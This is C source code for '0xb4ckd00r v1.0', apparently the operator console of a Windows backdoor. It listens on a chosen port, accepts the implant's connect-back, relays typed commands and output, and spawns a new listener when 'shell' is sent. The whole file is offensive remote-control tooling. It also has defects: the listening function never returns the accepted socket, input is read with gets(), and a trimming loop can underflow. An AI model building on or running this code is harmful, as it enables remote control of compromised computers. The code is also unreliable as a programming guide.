/*
 Author: Chema Garcia (aka sch3m4)
 Date: 2007
 Contact:
    http://safetybits.net
    sch3m4@safetybits.net
    http://twitter.com/sch3m4
*/

#include <stdio.h>
#include <stdbool.h>
#include <winsock2.h>
#include <windows.h>

const char	Baner[]="\n\n         ___         _      _  _          _        _   ___    ___\n"
					"        / _ \\ __  __| |__  | || |    ___ | | __ __| | / _ \\  / _ \\  _ __\n"
					"       | | | |\\ \\/ /| '_ \\ | || |_  / __|| |/ // _` || | | || | | || '__|\n"
					"       | |_| | >  < | |_) ||__   _|| (__ |   <| (_| || |_| || |_| || |\n"
					"        \\___/ /_/\\_\\|_.__/    |_|   \\___||_|\\_\\\\__,_| \\___/  \\___/ |_| v1.0\n\n";

const char	CMD[]="\n[CMD]# ";					
	
SOCKET Escucha(short Puerto)
{
	//estructuras para el socket
    SOCKET s;
    WSADATA wsadata;
    struct sockaddr_in sa;
    
    //creamos las estructuras
    WSACleanup();
    WSAStartup(MAKEWORD(2,2),&wsadata);
    s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0);
    sa.sin_family=AF_INET;
    sa.sin_port=htons(Puerto);
    sa.sin_addr.s_addr=htonl(INADDR_ANY);    
    //esperamos la conexion
    bind(s,(struct sockaddr *)&sa,sizeof(sa));
    listen(s, 5);
    accept(s,0,0);
}

int main(int argc,char *argv[])
{
	SOCKET 				sock;
	HANDLE				StdOut;
	unsigned int 		i;
	short				puerto;
	char 				Buffer[1024];
	WSAEVENT			evento;
	STARTUPINFO			si;
	PROCESS_INFORMATION	pi;	
	
	SetConsoleTitle("0xb4ckd00r v1.0");
	StdOut=GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(StdOut,FOREGROUND_GREEN | FOREGROUND_INTENSITY | BACKGROUND_BLUE);

	puerto=1;
	while(puerto>0)
	{
		system("cls");
		printf("%s",Baner);
		
		printf("\n[+] Puerto Local (0 para salir): ");
		fflush(stdin);
		scanf("%d",&puerto);
		if(puerto>0)
		{
			printf("[+] Esperando conexion....");
			sock=Escucha(puerto);
			if(sock==INVALID_SOCKET)
			printf("\n[!] Error en el socket");
			else{
				puts("OK");
				Sleep(1000);

				system("cls");
				while(1)
				{
					//leemos
					evento=WSACreateEvent();
					WSAEventSelect(sock,evento,FD_READ);
					while(WSAWaitForMultipleEvents(1,&evento,true,1000,false)==WSA_WAIT_EVENT_0)
					{
						memset(&Buffer,0,sizeof(Buffer));
						recv(sock,Buffer,sizeof(Buffer),0);
						printf("%s",Buffer);
						WSACloseEvent(evento);
						evento=WSACreateEvent();
						WSAEventSelect(sock,evento,FD_READ);
					}
						
					//miramos si se ha desconectado
					WSACloseEvent(evento);
					evento=WSACreateEvent();
					WSAEventSelect(sock,evento,FD_CLOSE);						
					if(WSAWaitForMultipleEvents(1,&evento,TRUE,100,false)==WSA_WAIT_TIMEOUT)
					{
						//escribimos
						memset(&Buffer,0,sizeof(Buffer));
						fflush(stdin);
						gets(Buffer);
							
						for(i=strlen(Buffer)-3;i<=strlen(Buffer);i++)
						if(Buffer[i]==0x0A || Buffer[i]==0x0D)
						Buffer[i]='\0';
							
						if(send(sock,Buffer,strlen(Buffer),0)<0)
						break;
						
						if(strncmp(Buffer,"shell",5)==0)
						{
							//si hemos pedido la shell, nos lanzamos
							ShellExecute(NULL,"open",argv[0],NULL,NULL,SW_SHOW);
						}						
							
						WSACloseEvent(evento);
					}else
					break;
				}
				closesocket(sock);
			}	
		}
	}

	return 0;
}
